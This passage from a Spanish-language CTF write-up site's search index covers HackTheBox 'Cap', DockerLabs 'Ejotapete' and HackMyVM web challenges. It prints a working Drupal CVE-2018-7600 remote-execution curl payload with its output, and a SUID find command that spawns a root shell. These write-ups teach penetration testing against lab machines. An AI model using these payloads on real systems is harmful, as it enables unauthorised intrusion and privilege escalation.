SF:y\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20Inv SF:alid\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp;#x27;R SF:TSP/1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRequest, SF:189,\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x SF:20Sat,\\x2017\\x20Aug\\x202024\\x2022:55:27\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x202 SF:32\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x203\\.2\\ SF:x20Final//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20Found\u0026lt;/ SF:h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20 SF:server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x2 SF:0check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 18 00:57:20 2024 -- 1 IP address (1 host up) scanned in 175.28 seconds\rVamos a ver el puerto 80:\nShell as nathan Podremos ver que estamos como el usuario Nathan, si investigamos un poco por la web podremos encontrarnos lo siguiente:\nPodremos ver que es como una captura de la red, si vemos en la izquierda en el panel podremos ver Security Snapshot (5 Second PCAP + Analysis) si entramos podremos ver lo siguiente:\nPodremos ver que nos a llevado a /data/6 y podemos descargarnos un archivo .pcap pero si nos lo descargamos y lo abrimos no habra nada, intentaremos ver mas data de la siguiente manera:\nPodremos ver que ahora si habra data, asi que nos bajaremos el .pcap:\nAhora lo abriremos con WireShark:\nSi bajamos un poco podremos ver data por el puerto 21 que es el FTP, y si vemos bien se efectua un login donde podemos encontrar la contrase√±a:\nProbaremos a iniciar por FTP a ver si son validas:\nBien son validas, ahora probaremos por SSH a ver si tambien nos funciona:\nShell as root Usaremos Linpeas y podremos ver lo siguiente:\nPodremos ir a GTFOBins y buscaremos python capabilities:\nroot! ;)\n","date":"2023-09-07","id":18,"permalink":"/writeups/hackthebox/cap/","summary":"Enumeration Comenzaremos con un escaneo nmap:\n# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.","tags":[],"title":"Cap"},{"content":" ","date":"2023-09-07","id":19,"permalink":"/writeups/dockerlabs/eclipse/","summary":" ","tags":[],"title":"Eclipse"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/DL/Ejotapete/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 172.17.0.2 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 11:09 CEST Initiating ARP Ping Scan at 11:09 Scanning 172.17.0.2 [1 port] Completed ARP Ping Scan at 11:09, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 11:09 Scanning 172.17.0.2 [65535 ports] Discovered open port 80/tcp on 172.17.0.2 Completed SYN Stealth Scan at 11:09, 0.67s elapsed (65535 total ports) Nmap scan report for 172.17.0.2 Host is up, received arp-response (0.0000060s latency). Scanned at 2025-07-17 11:09:56 CEST for 1s Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 64 MAC Address: 02:42:AC:11:00:02 (Unknown) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos el puerto 80 abierto, vamos a lanzar un segundo escaneo para ver que servicio y versi√≥n corren en el:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/DL/Ejotapete/nmap] ‚îî‚îÄ$ nmap -p80 -sCV 172.17.0.2 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 11:10 CEST Nmap scan report for 172.17.0.2 Host is up (0.000031s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.25 (Debian) MAC Address: 02:42:AC:11:00:02 (Unknown) Service Info: Host: 172.17.0.2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds\rBien vemos devuelve un 403 Forbidden, as√≠ que estar√° haciendo mal el redirect o habr√° algo oculto. Vamos a verlo en firefox:\nHmm\u0026hellip; Vamos a hacer fuzzing a ver si encontramos algo m√°s interesante:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/DL/Ejotapete/nmap] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://172.17.0.2/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.17.0.2/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ drupal [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]\rVemos una carpeta llamada drupal, esto ya es m√°s interesante. Vamos a acceder a ella:\nInteresante vamos a realizar fuzzing a la carpeta drupal a ver si encontramos alg√∫n archivo predeterminado que nos pueda chivar la versi√≥n:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/DL/Ejotapete/nmap] 11:15:26 [9/9] ‚îî‚îÄ$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://172.17.0.2/drupal/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.17.0.2/drupal/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.php [Status: 200, Size: 8902, Words: 1473, Lines: 233, Duration: 201ms] contact [Status: 200, Size: 12198, Words: 1639, Lines: 252, Duration: 81ms] search [Status: 302, Size: 388, Words: 60, Lines: 12, Duration: 10ms] user [Status: 302, Size: 384, Words: 60, Lines: 12, Duration: 6ms] themes [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms] modules [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 0ms] admin [Status: 403, Size: 8087, Words: 1367, Lines: 214, Duration: 18ms] node [Status: 200, Size: 8892, Words: 1473, Lines: 233, Duration: 11ms] sites [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms] Search [Status: 302, Size: 388, Words: 60, Lines: 12, Duration: 1009ms] Contact [Status: 200, Size: 12180, Words: 1638, Lines: 252, Duration: 11ms] core [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms] install.php [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 0ms] profiles [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms] update.php [Status: 403, Size: 133, Words: 21, Lines: 1, Duration: 98ms] README.txt [Status: 200, Size: 5889, Words: 748, Lines: 140, Duration: 0ms] vendor [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 0ms]\rVemos el archivo install.php, vamos a acceder a el:\nBien tenemos la versi√≥n de Drupal que es la 8.5.0, si hacemos una b√∫squeda de ella podremos darnos cuenta de que hay publicado un CVE:\nhttps://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2018-7600 Shell as www-data Vamos a explotarlo!!\nInvestigando me encontr√© con el siguiente payload:\ncurl -s \u0026#39;http://DRUPAL-TARGET/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#39; \\ --data \u0026#39;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[a][#post_render][]=exec\u0026amp;mail[a][#type]=markup\u0026amp;mail[a][#markup]=id\u0026#39;\rVamos a probarlo contra nuestro objetivo:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/DL/Ejotapete/nmap] ‚îî‚îÄ$ curl -s \u0026#39;http://172.17.0.2/drupal/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#39; \\ --data \u0026#39;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[a][#post_render][]=exec\u0026amp;mail[a][#type]=markup\u0026amp;mail[a][#markup]=id\u0026#39; {\u0026#34;command\u0026#34;:\u0026#34;insert\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;replaceWith\u0026#34;,\u0026#34;selector\u0026#34;:null,\u0026#34;data\u0026#34;:\u0026#34;uid=33(www-data) gid=33(www-data) groups=33(www-data)\\u003Cspan class=\\u0022ajax-new-content\\u0022\\u003E\\u003C\\/span\\u003E\u0026#34;,\u0026#34;settings\u0026#34;:null}]\rBien!! Logramos una ejecuci√≥n remota de comandos. Ahora nos enviaremos una reverse shell:\nShell as root Vamos a enumerar binarios con el permiso SUID:\nwww-data@42beeea01109:/var/www/html/drupal$ find / -perm -4000 -ls 2\u0026gt;/dev/null find / -perm -4000 -ls 2\u0026gt;/dev/null 4850458 40 -rwsr-xr-x 1 root root 40504 May 17 2017 /usr/bin/chsh 4850546 40 -rwsr-xr-x 1 root root 40312 May 17 2017 /usr/bin/newgrp 4850503 76 -rwsr-xr-x 1 root root 75792 May 17 2017 /usr/bin/gpasswd 4850556 60 -rwsr-xr-x 1 root root 59680 May 17 2017 /usr/bin/passwd 4882251 220 -rwsr-xr-x 1 root root 221768 Feb 18 2017 /usr/bin/find 4850456 52 -rwsr-xr-x 1 root root 50040 May 17 2017 /usr/bin/chfn 4882165 140 -rwsr-xr-x 1 root root 140944 Jan 23 2021 /usr/bin/sudo 4849935 44 -rwsr-xr-x 1 root root 44304 Mar 7 2018 /bin/mount 4849958 32 -rwsr-xr-x 1 root root 31720 Mar 7 2018 /bin/umount 4849951 40 -rwsr-xr-x 1 root root 40536 May 17 2017 /bin/su\rVemos el binario find que si lo buscamos en GTFObins nos comentan lo siguiente:\nBien vamos a explotarlo:\nwww-data@42beeea01109:/var/www/html/drupal$ /usr/bin/find . -exec /bin/bash -p \\; -quit ; -quitn/find . -exec /bin/bash -p \\; bash-4.4# whoami whoami root\r","date":"2023-09-07","id":20,"permalink":"/writeups/dockerlabs/ejotapete/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/DL/Ejotapete/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 172.17.0.2 Starting Nmap 7.","tags":[],"title":"Ejotapete"},{"content":" ","date":"2023-09-07","id":21,"permalink":"/writeups/hackmyvm/method/","summary":" ","tags":[],"title":"Method (Video)"},{"content":" ","date":"2023-09-07","id":22,"permalink":"/writeups/dockerlabs/upload/","summary":" ","tags":[],"title":"Upload"},{"content":"Vamos a ver la web:\nVemos un simple login, no disponemos ning√∫n tipos de credenciales. Vamos a leer el c√≥digo fuente:\nEncontramos una contrase√±a!! Vamos a probarla:\n","date":"2025-07-16","id":23,"permalink":"/challenges/hackmyvm/002/","summary":"Vamos a ver la web:\nVemos un simple login, no disponemos ning√∫n tipos de credenciales. Vamos a leer el c√≥digo fuente:","tags":[],"title":"002 (Web)"},{"content":"\r","date":"2025-07-16","id":24,"permalink":"/challenges/hackmyvm/009/","summary":"\r","tags":[],"title":"009 (Web)"},{"content":"Vamos a ver la web:\nVemos que solo hay una imagen, vamos a ver el c√≥digo fuente:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; img { display: block; margin-left: auto; margin-right: auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;logo.png\u0026#34; alt=\u0026#34;HMV\u0026#34; style=\u0026#34;width:50%;\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\rNo vemos nada interesante. Vamos a hacer fuzzing con gobuster por archivos y directorios:\n‚ùØ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#39;http://momo.hackmyvm.eu/\u0026#39; -x php,html,js,txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://momo.hackmyvm.eu/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,js,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 268] /robots.txt (Status: 200) [Size: 15]\rVemos un robots.txt , vamos a ver su contenido:\n","date":"2025-07-16","id":25,"permalink":"/challenges/hackmyvm/014/","summary":"Vamos a ver la web:\nVemos que solo hay una imagen, vamos a ver el c√≥digo fuente:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; img { display: block; margin-left: auto; margin-right: auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;logo.","tags":[],"title":"014 (Web)"},{"content":"Link to valuable, relevant resources.\n","date":"2024-02-27","id":26,"permalink":"/challenges/resources/","summary":"Link to valuable, relevant resources.","tags":[],"title":"Resources"},{"content":"Link to valuable, relevant resources.\n","date":"2024-02-27","id":27,"permalink":"/writeups/resources/","summary":"Link to valuable, relevant resources.","tags":[],"title":"Resources"},{"content":"","date":"2023-09-07","id":28,"permalink":"/challenges/","summary":"","tags":[],"title":"Bienvenido"},{"content":"","date":"2023-09-07","id":29,"permalink":"/writeups/","summary":"","tags":[],"title":"Bienvenido"},{"content":"","date":"2023-09-07","id":30,"permalink":"/challenges/intro/","summary":"","tags":[],"title":"INTRO"},{"content":"","date":"2023-09-07","id":31,"permalink":"/writeups/intro/","summary":"","tags":[],"title":"INTRO"},{"content":"","date":"2025-06-15","id":32,"permalink":"/tags/arch-linux/","summary":"","tags":[],"title":"Arch Linux"},{"content":"","date":"2025-06-15","id":33,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"2025-06-15","id":34,"permalink":"/tags/cve-2023-3452/","summary":"","tags":[],"title":"CVE-2023-3452"},{"content":"","date":"2025-06-15","id":35,"permalink":"/tags/nvidia/","summary":"","tags":[],"title":"Nvidia"},{"content":"","date":"2025-06-15","id":36,"permalink":"/categories/poc/","summary":"","tags":[],"title":"PoC"},{"content":"","date":"2025-06-15","id":37,"permalink":"/tags/rce/","summary":"","tags":[],"title":"RCE"},{"content":"","date":"2025-06-15","id":38,"permalink":"/tags/rfi/","summary":"","tags":[],"title":"RFI"},{"content":"","date":"2025-06-15","id":39,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"},{"content":"","date":"2025-06-15","id":40,"permalink":"/tags/unauthenticated/","summary":"","tags":[],"title":"Unauthenticated"},{"content":"","date":"2023-09-07","id":41,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":42,"permalink":"/","summary":"","tags":[],"title":"pylon"},{"content":"","date":"0001-01-01","id":43,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"}]